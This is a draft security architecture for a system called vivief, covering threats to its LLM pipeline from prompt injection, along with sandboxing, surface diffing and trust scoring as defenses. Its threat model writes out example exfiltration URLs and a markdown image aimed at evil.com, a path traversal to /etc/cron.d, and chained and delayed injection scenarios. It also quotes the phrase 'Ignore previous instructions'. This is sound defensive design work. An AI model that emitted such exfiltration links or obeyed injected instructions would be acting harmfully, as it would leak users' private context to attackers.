# vivief Security Architecture

## Status: Draft v0.3 — threat model + bridge security consolidated

> Security is Contract enforcement at bridge boundaries. This document captures vivief's complete security model: threat analysis, sandbox architecture, and how every bridge boundary maps to Contracts within the vivief concept model.
>
> Consolidated from: original threat analysis (v0.2) + [secure-bridging brainstorm](../../archive/security/secure-bridging.md) (archived 2026-04-09).

---

## 1. Threat Model

### 1.1 The Fundamental Problem

LLM-integrated systems face a unique security challenge with no equivalent in traditional software: the processing engine (LLM) treats all input — trusted instructions and untrusted data — as the same undifferentiated token stream. There is no parameterized query equivalent for natural language processing. This is not a bug to be fixed; it is an inherent property of how LLMs work.

### 1.2 Attack Taxonomy

**Direct Injection** — User crafts input to override system behavior. Well-understood, partially mitigable through prompt design and input validation. Lowest sophistication, highest volume.

**Indirect Injection** — Malicious instructions embedded in content the LLM retrieves: web pages, API responses, code files, documents. The LLM processes them as context and follows the embedded instructions. This is vivief's primary threat vector since the system fetches and analyzes external content.

**Multi-Step / Chained Attacks** — Benign-looking inputs that across multiple turns or tool calls gradually shift LLM behavior. No single step looks malicious. Hard to detect because the attack surface is distributed across time and context.

**Tool-Use Exploitation** — Manipulating the LLM into calling tools with attacker-controlled parameters. Critical when tools have side effects (file writes, API calls, network requests).

**Semantic Manipulation** — Poisoning LLM output quality without triggering any technical detection. Biased summaries, misinformation injection, suppressed information. No tool abuse, no exfiltration — just wrong output.

### 1.3 Concrete Attack Vectors

#### URL-Based Exfiltration
An LLM with fetch access that has seen sensitive context can be instructed by a poisoned document to request an attacker-controlled URL with stolen data encoded as query parameters, subdomains, or path segments.

Variants:
- Query parameter leaking: `https://evil.com/log?data=STOLEN`
- DNS exfiltration: `https://STOLEN_DATA.evil.com/` — data visible in DNS logs even if request fails
- Markdown image injection: LLM outputs `![](https://evil.com/log?d=STOLEN)` — if renderer loads images, the browser makes the request without tool access

#### Tool Parameter Manipulation
- Path traversal via file write tools: `../../../../etc/cron.d/backdoor`
- Search query injection: tricking the LLM into searching for sensitive internal data
- Shell injection through parameters passed to system commands

#### Invisible Exfiltration Channels
- Zero-pixel images in HTML/markdown output
- Disguised links (display text differs from actual URL)
- Data encoded in output structure, word choice, or tool selection patterns

#### Multi-Step Chained Attacks
Each step individually defensible, combined they achieve exfiltration:
1. Poisoned source suggests "include reference links" (reasonable)
2. The link template includes context data as parameters (looks like verification)
3. Attacker-controlled domain harvests the context

#### Context Manipulation
- Context window pollution: injecting large volumes of invisible text (white-on-white, zero-width characters) to push system prompts out of context
- Delayed triggers: instructions that only activate on specific future user queries, passing all testing

---

## 2. Core Security Principles

### 2.1 The vivief Trust Hierarchy

```
Human Judgment  →  highest trust, final authority, informed by signals
Deterministic Code  →  security boundary, validates and enforces
LLM Reasoning  →  untrusted output, useful but never authoritative
External Data  →  untrusted input, always potentially adversarial
```

This aligns with vivief's core philosophy: LLM reasoning, deterministic systems, and human judgment each do what they do best. Security is where this philosophy becomes non-negotiable.

### 2.2 Foundational Rules

1. **Every LLM output is untrusted input** to deterministic systems. The datom/CRDT layer validates, not just persists.
2. **Deterministic guardrails over LLM guardrails.** The deterministic layer is the security boundary, not the LLM. Prompt-level defenses are speed bumps, not walls.
3. **Capability scoping per context.** An LLM processing untrusted content must not have access to write tools. Separate "understand" from "act."
4. **Assume breach.** Design so that a successful injection has limited blast radius. Principle of least privilege applied to every LLM invocation.
5. **Infrastructure-level enforcement.** Every security constraint must be enforced by deterministic code at the infrastructure/tool level, never by asking the LLM to behave.

---

## 3. LLM State & Injection Persistence Mechanics

Understanding *where* an injected instruction can persist is essential to designing detection. The LLM itself is stateless — but the orchestration around it is not.

### 3.1 The Stateless LLM

A single LLM API call is a pure function: tokens in → tokens out. An injected instruction influences the *current completion* only. When the call completes, the LLM retains nothing. The instruction does not "infect" the model. This is the good news.

The bad news: the danger isn't the LLM remembering — it's what the LLM *does during that one call* and what the surrounding system persists on its behalf.

### 3.2 Persistence Surfaces (Where Injection Survives)

Every mutable surface the LLM can write to — directly or indirectly — is a persistence path for injected instructions:

**Conversation History (managed by orchestrator code)**
If the orchestrator appends LLM output to a conversation array and sends it in subsequent calls, a poisoned output persists as an `assistant` message. Every future call sees the injected content as trusted prior context. The LLM's own output becomes the vector for ongoing contamination.

**Tool-Written Files (memory.md, scratchpads, notes, summaries)**
This is the most dangerous persistence path. If the LLM has a write-to-file tool — exactly how memory systems, "remember this" features, and scratchpads work — an injected instruction can say "write X to memory.md." The poisoned content now outlives the context window that created it, surviving across sessions indefinitely.

**Datastore Writes (datoms, CRDT state, database records)**
Same pattern as files but harder to diff. If the LLM can write datoms, update CRDT state, or insert records, the injection has persistent real-world effects in structured storage.

**Dynamic Prompt Assembly Sources**
If the orchestrator reads from files or databases to construct system prompts (e.g., loading user preferences from a config file), and the LLM can write to those sources, injection can modify *future system prompts*. This is the most severe path — it's self-reinforcing. The injected instruction rewrites the rules the LLM operates under.

**Outbound Requests (side-channel persistence)**
Network requests made during a call persist as server logs, DNS records, and webhook payloads on attacker-controlled infrastructure. Data leaves your system boundary permanently.

### 3.3 What This Means for Detection

Each persistence surface is a **diffable checkpoint**. Since the LLM is stateless, every lasting effect of injection must be visible as a state change in one of these surfaces:

```
Persistence Surface          Diffable?   Detection Method
─────────────────────────    ─────────   ─────────────────────────
Conversation history         Yes         Array length + content hash
Tool-written files           Yes         File hash before/after
Datastore records            Yes         Record count + content hash
Prompt assembly sources      Yes         Hash of all prompt inputs
Outbound network requests    Yes         Request log (empty = clean)
LLM internal state           N/A         Does not exist — stateless
```

The critical insight: **in a properly sandboxed environment, the ingestion LLM should produce zero side effects other than its structured output.** Any file change, any unexpected network request, any state mutation beyond the expected output is *by definition* a violation. The diff isn't looking for subtle anomalies — it's a binary check: did anything change that shouldn't have?

---

## 4. Architecture: Sandbox → Store → Deterministic Render

### 4.1 The Pattern

```
┌─────────────────────┐
│  INGESTION SANDBOX   │  LLM processes external content
│  - Network: allowlist │  - No write tools
│  - No user context   │  - No access to system state
│  - Output: structured │  - Stateless
└──────────┬──────────┘
           │ structured data only
           ▼
┌─────────────────────┐
│  VALIDATED STORE     │  Deterministic code validates
│  - Schema validation │  - Content hashed for provenance
│  - Trust score       │  - Marked as untrusted-origin
│  - Datom storage     │  - Audit trail via event sourcing
└──────────┬──────────┘
           │ data only, never instructions
           ▼
┌─────────────────────┐
│  RECAP SANDBOX       │  LLM combines stored content
│  - No network        │  - Input: stored files only
│  - Output: text only │  - Stateless
│  - Contract-checked  │
└──────────┬──────────┘
           │ validated output
           ▼
┌─────────────────────┐
│  DETERMINISTIC RENDER│  No LLM in this path
│  - Plain text/safe   │  - No image loading from content
│    markup only       │  - Links shown with real domains
│  - Trust signals     │  - User sees provenance + trust score
│    shown to user     │
└─────────────────────┘
```

### 4.2 Ingestion Sandbox Constraints

- **Domain allowlist enforced at network level** — the orchestrator constructs URLs, the LLM specifies which pre-approved resource it wants, never raw URLs
- **No query parameter passthrough** — prevents exfiltration via URL construction
- **No user context injected** — the ingestion LLM has no system prompts, user data, or prior conversation to steal
- **Response size limits** — prevents context pollution attacks
- **Structured output only** — LLM emits JSON conforming to a schema, deterministic code parses it. No freeform text that gets interpreted.

### 4.3 Recap Sandbox Constraints

- **No network access at all** — eliminates all exfiltration paths
- **Input: stored content only** — no system state, no user context beyond what's needed
- **Stateless** — no conversation history, no memory between invocations
- **Output contract enforced** — deterministic validation (see §4)

### 4.4 Rendering Layer Constraints

- **No LLM in the rendering path** — content is presented by deterministic code only
- **No image loading from URLs in stored content** — kills invisible pixel exfiltration
- **No HTML/markdown interpretation of LLM output** — strict sanitizer or plain text only
- **All links treated as untrusted** — displayed with actual domain visible, never auto-followed
- **Trust provenance visible to user** — content is labeled with origin, trust score, and processing chain

### 4.5 Critical Discipline: Keep It Deterministic

The moment any future feature pipes stored untrusted content back into an LLM with tool access — even "just for search" or "just to answer a question" — the entire security model collapses. This boundary must be enforced architecturally (making it hard to do) not by convention (hoping nobody does it).

---

## 5. Detection Layers

Neither layer blocks automatically. They produce trust signals for the deterministic layer and ultimately the human.

### 5.1 Pre-Processing: Instruction Detection

An LLM scans incoming content for embedded instructions before ingestion.

**What it catches:** Naive injection attempts (~60-70% of real-world attacks). "Ignore previous instructions", role-play triggers, explicit tool-use commands.

**Limitations:**
- The detector LLM is itself vulnerable to injection
- High false positive rate on legitimate content *about* prompt injection, tutorials, security articles
- Encoding bypasses: base64, unicode tricks, multi-language switching, split instructions

**Role in vivief:** Cheap first filter. Flags content, doesn't block it. IDS (intrusion detection), not firewall. Results feed into the trust score.

### 5.2 Post-Processing: Behavioral Contract Validation

Deterministic comparison of LLM input vs. output against a defined contract.

**What it catches:** The *effect* of injection rather than the injection itself. Sidesteps the arms race of detecting ever-cleverer payloads.

**Contract checks per LLM step:**
- No new URLs introduced that weren't in source input
- No imperative sentences in fields typed as "factual summary"
- Token-level similarity between output claims and input source within expected bounds
- Output length proportional to input length (tiny input → huge output is suspicious)
- Output conforms to expected schema — structural deviation indicates behavioral manipulation
- No references to entities, tools, or actions absent from input and system prompt

**Role in vivief:** Stronger than instruction detection because it's deterministic and checks outcomes not patterns. Contract violations produce trust score adjustments and audit log entries.

### 5.3 Mutable Surface Diffing

The strongest detection mechanism available, derived from the statelessness insight in §3. Every LLM call is wrapped in a deterministic snapshot-diff cycle.

**Before each LLM call, snapshot:**
- Hash of every file the LLM's tools can write to
- Record count + content hash of datastore records in scope
- Hash of all prompt assembly inputs (config files, preference stores)
- Empty outbound request log

**After each call, diff:**
- Any file hash changed? → Was a write tool called? Was it expected for this task?
- New records created? → Do they match the expected output schema?
- Outbound requests made? → Were they to allowlisted domains? Do URLs contain suspicious data in parameters?
- Prompt assembly sources modified? → **Critical alert** — potential self-reinforcing injection

**Binary violation detection in sandboxes:**
In the ingestion sandbox, the expected side effects are: one structured output conforming to schema. *Everything else is a violation.* No threshold tuning, no false positive balancing — any unexpected state change is by definition wrong. This makes it fundamentally stronger than pattern-based detection.

In the recap sandbox: no network, no file writes, only structured output. The diff is trivial — nothing should change except the output appearing.

**What this doesn't catch:**
Output poisoning *within the expected output field*. The LLM writes a well-formed summary to the correct field, but the content is subtly manipulated. The diff sees "new output appeared" which is expected. Detecting poisoned *content* requires the contract validation approach in §5.2.

### 5.4 Combined Trust Scoring

```
trust_score = f(
  source_reputation,        // known domain vs unknown
  instruction_detection,    // flags from pre-processing
  contract_violations,      // flags from post-processing
  surface_diff_violations,  // unexpected state changes (binary, high weight)
  provenance_chain_length,  // how many LLM steps touched this
)
```

The deterministic layer uses the trust score for presentation decisions. The human sees the score and exercises judgment. This is the correct division of responsibility.

---

## 6. Residual Risks (Accepted)

These are risks the architecture cannot eliminate. They must be communicated to users.

### 6.1 Semantic Manipulation
A poisoned source can influence the LLM to produce subtly biased or misleading summaries without triggering any technical detection. No tool abuse, no exfiltration — just wrong text. Mitigated only by user awareness and source diversity.

### 6.2 Cross-Document Contamination
When the recap sandbox sees multiple stored files, one poisoned file can influence how the LLM summarizes the others. The contract validator catches gross deviations but subtle bias shifts are undetectable.

### 6.3 No Formal Verification
It is impossible to prove an LLM will behave correctly on arbitrary input. This is fundamentally different from traditional security. All mitigations are probabilistic, not guaranteed.

### 6.4 Capability-Safety Tradeoff
Every restriction that makes injection harder also makes the LLM less useful. A model that can't follow nuanced instructions in fetched content also can't do its job well. This tension is inherent and requires ongoing calibration.

---

## 7. What Doesn't Work (Anti-Patterns)

Documented to prevent future regressions.

- **Prompt hardening alone** ("you must never...") — helps against naive attacks, crumbles against determined ones
- **Content filtering via regex/keyword** — too many false positives/negatives; can't regex a semantic problem
- **Fine-tuning for robustness** — improves baseline but doesn't eliminate the architectural flaw
- **Trusting LLM self-assessment** — "are you being manipulated?" is itself manipulable
- **Security through obscurity** of system prompts — assume the attacker knows your prompt

---

## 8. Implementation Checklist

### Must-Have (MVP)
- [ ] Network-level domain allowlist for ingestion sandbox
- [ ] No tool access in any sandbox that processes untrusted content
- [ ] Structured output schemas for all LLM steps
- [ ] Deterministic schema validation on all LLM output before storage
- [ ] Content provenance tracking (source URL, timestamp, processing chain hash)
- [ ] Deterministic-only rendering path with no LLM in the loop
- [ ] HTML/markdown sanitizer stripping images, scripts, iframes from stored content
- [ ] Links rendered with visible actual domain
- [ ] Audit log of all LLM invocations with full input/output
- [ ] Mutable surface snapshot/diff on every LLM call (file hashes, record counts, request logs)

### Should-Have (Post-MVP)
- [ ] Instruction detection pre-filter with trust score integration
- [ ] Behavioral contract validation on LLM outputs
- [ ] Trust score computation and user-visible provenance display
- [ ] Architectural enforcement preventing untrusted content from reaching tool-enabled LLMs (compile-time or init-time check, not runtime convention)
- [ ] Rate limiting on all tool invocations independent of LLM behavior
- [ ] Content hash chain for tamper detection on stored data

### Future Exploration
- [ ] Separate reader LLM (low privilege) from actor LLM (tool access) architecture
- [ ] Multi-agent trust propagation framework
- [ ] Anomaly detection on LLM behavioral patterns over time
- [ ] Formal threat modeling updates as new attack patterns emerge

---

## 8. Key Insight

> Prompt injection is to LLM systems what SQL injection was to web apps in 2005 — everyone knows it's a problem, partial mitigations exist, but the industry hasn't converged on a definitive solution. The difference: SQL injection got solved with parameterized queries (a clean architectural boundary). No equivalent exists for prompt injection yet, and it may not exist given the nature of LLMs. vivief's approach — deterministic boundaries, sandboxed LLMs, trust signals, and human judgment — is the strongest practical pattern available today.

---

---

## 9. Security at Bridge Boundaries

Every bridge boundary in vivief is a security boundary. Every inbound bridge is an injection vector. Every outbound bridge is an exfiltration path. Every landing is a persistence surface.

### Core thesis

**Security is not a separate layer — it is Contract enforcement at bridge boundaries.**

```
Source (untrusted)
  → Inbound Bridge (effectHandler + Contract)
    → Validated Store (datoms with trust metadata)
      → Projection (scoped by trust, redacted by Contract)
        → Creation (effectHandler, sandboxed by trust level)
          → Outbound Bridge (effectHandler + Contract)
            → Landing (native medium, validated)
```

### Inbound bridge trust levels

| Source | Trust level | Contract at boundary |
|--------|-----------|---------------------|
| Human input (voice, text) | Authoritative | Schema Contract (structure) |
| Datom store (own datoms) | Committed | Projection Contract (scoped access) |
| Datom store (AI-written) | Gated | Schema + provenance check |
| Local filesystem | High | Parser validates structure |
| Git (own repo) | High | Commit signature, branch protection |
| GitHub (issues, PRs) | Medium | Schema Contract on API response |
| Web content | Adversarial | Ingestion Sandbox + instruction detection |
| External APIs | Adversarial | Schema Contract + trust scoring |
| LLM reasoning | Untrusted | Behavioral Contract + surface diffing |
| Other agents | Untrusted | Sync Contract + trust propagation |

### Outbound bridge persistence risk

| Landing | Risk | Contract at boundary | Detection |
|---------|------|---------------------|-----------|
| Files on disk | HIGH | Behavior Contract (allowed paths) | File hash before/after |
| Git commits | HIGH | Pre-commit Contract | Commit content validation |
| Datom store | HIGH | Schema Contract pre-commit | Record count + content hash |
| LLM memory datoms | CRITICAL — self-reinforcing | Schema + behavioral + human gate | Memory diff per conversation |
| Network requests | CRITICAL | Network allowlist (deterministic) | Request log |
| Prompt assembly sources | CRITICAL | Read-only to LLM | Hash of all prompt inputs |

### Security concern → Contract mapping

| Security concern | Contract type | Where it applies |
|-----------------|--------------|-----------------|
| What data can exist | Schema Contract | Inbound bridge: validate structure |
| Who can see what | Projection Contract | Context: scope + redaction per trust |
| What can be displayed | Render Contract | Surface: sanitize, no untrusted image loading |
| Who can do what | Trust Contract | All bridges: capability scoping per actor |
| What effects are allowed | Behavior Contract | Outbound: allowed tools, paths, actions |
| How conflicts resolve | Sync Contract | P2P: trust propagation across peers |

---

## 10. Sandbox as Projection Scope

Sandbox = scoped Projection + gated promotion Contract. This IS the ingestion sandbox from §4, expressed in vivief concepts:

| Sandbox level | Sees | Does | Network | Trust |
|--------------|------|------|---------|-------|
| **Ingestion** | Untrusted content only | Structured analysis only | Allowlisted domains | Lowest |
| **Creation** | Own sandbox datoms + scoped context | Write to sandbox, propose effects | None | Medium |
| **Recap** | Stored validated content | Text output only | None | Higher |

Each is a Projection scope + Behavior Contract + Trust Contract. No special "sandbox infrastructure" — just the five concepts applied with security constraints.

---

## 11. Detection Layers as Contracts

The detection layers from §5 map directly to Contract types:

| Detection layer | Contract type | Mode |
|----------------|--------------|------|
| Instruction detection | Guard Contract | Pre-commit — flags, doesn't block |
| Behavioral validation | Guard Contract | Post-processing — checks outcomes |
| Surface diffing | Guard Contract | Binary — any unexpected change = violation |
| Trust scoring | Aggregation Contract | Derives trust datom from all signals |

The detection stack composes:
```
Content → InstructionDetection(Guard) → trust signal
  → Sandbox effectHandler
    → SurfaceDiff.before() → snapshot
    → [LLM processes]
    → SurfaceDiff.after() → binary violation
    → BehavioralValidation(Guard) → trust signals
  → TrustScore(Aggregation) → trust datom
  → Projection(trust >= threshold) → Render Contract → user
```

---

## 12. Self-Reinforcing Memory Defense

The most dangerous persistence path: if LLM memory is datoms and the LLM reads its memory via Projection, poisoned memory datoms load into future context and reinforce the poison.

**Defense layers:**
1. Memory datoms carry trust score from the conversation that created them
2. Projection can filter memory by trust threshold
3. Memory writes during untrusted-content processing are flagged
4. High-impact memory changes require human approval
5. Memory datoms are append-only — can revert to any prior state
6. Periodic audit: "show memory datoms written while processing untrusted content"

---

## 13. Contract Defaults as Configuration Points

Security questions that can't be fully answered at design time become Contract configuration points:

| Configuration point | Default | Refinement path |
|---|---|---|
| Trust score shape | Single number (0.0–1.0) | Clinical may need vector; add dimensions when single number proves insufficient |
| Human review threshold | All convention-changing writes | Clinical = all AI writes. Dev = project-level only |
| Trust propagation rule | `min(source_trusts)` (conservative) | Dev tooling = weighted average may suffice |
| Trust evolution | No automatic increase | Known curated sources may earn trust via human approval |
| Capability-safety balance | Strict by default, relax explicitly | Track false-positive rate; relax where noise exceeds signal |

Defaults are datoms: `[config:X :config/value "default" tx:1 true]`. Refinement is datom evolution with provenance tracking why the default changed.

**Contract evolution lifecycle:** `:default` → `:domain-refined` → `:experience-refined` → `:locked`. Each transition is a datom assertion with provenance — the system self-documents its own security evolution.

---

*Document origin: Threat analysis (March 2026) + bridge security consolidation (April 2026).*
